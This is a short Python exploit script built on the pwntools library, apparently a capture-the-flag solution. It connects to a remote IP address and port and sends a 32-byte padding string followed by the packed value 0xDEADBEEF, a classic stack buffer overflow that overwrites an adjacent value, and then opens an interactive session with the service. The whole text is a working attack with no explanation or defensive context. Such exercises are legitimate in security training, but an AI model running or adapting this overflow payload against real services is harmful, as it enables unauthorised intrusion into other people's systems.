from pwn import *

p = remote("146.19.212.156", 10001)

payload = b"A" * 32
payload += p32(0xDEADBEEF)
p.sendline(payload)

p.interactive()